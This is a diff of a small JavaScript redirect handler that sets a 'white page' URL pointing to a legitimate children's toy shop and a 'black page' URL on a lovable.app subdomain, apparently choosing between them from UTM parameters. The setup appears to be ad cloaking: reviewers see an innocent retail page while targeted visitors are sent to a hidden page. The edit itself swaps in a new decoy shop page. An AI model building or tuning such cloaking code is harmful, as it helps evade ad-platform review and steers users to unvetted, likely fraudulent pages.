@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://maileg.com/products/cradle-my-light-rose";
+    const whitePageURL = "https://donebydeer.com/en-dk/collections/activity-toys-for-babies-and-toddlers/products/hide-seek-activity-toy-clucky-sand";
     const blackPageURL = "https://wherlnquz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
